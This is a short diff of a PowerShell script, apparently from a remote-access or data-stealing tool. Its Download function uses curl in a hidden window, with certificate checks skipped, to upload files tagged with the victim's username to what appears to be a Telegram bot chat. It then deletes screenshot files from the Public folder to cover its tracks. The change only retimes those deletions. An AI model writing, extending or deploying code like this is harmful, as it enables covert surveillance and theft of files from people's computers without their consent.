@@ -132,11 +132,13 @@ function Download($FileToDownload) {
   $curl = InstallCurl
   $argumenlist = $uri + ' -F chat_id=' + "$ChatID" + ' -F document=@' + $FileToDownload  + ' -F caption=Client:' + $username + ' -k '
   Start-Process $curl -ArgumentList $argumenlist -WindowStyle Hidden
-  Start-Sleep -Seconds 10
+  
   if ([System.IO.File]::Exists("C:\Users\Public\screenshot.jpg")) {
+    Start-Sleep -Seconds 15
     Remove-Item "C:\Users\Public\screenshot.jpg"
   }
   if ([System.IO.File]::Exists("C:\Users\Public\image.jpg")) {
+    Start-Sleep -Seconds 15
     Remove-Item "C:\Users\Public\image.jpg"
   }
   else {
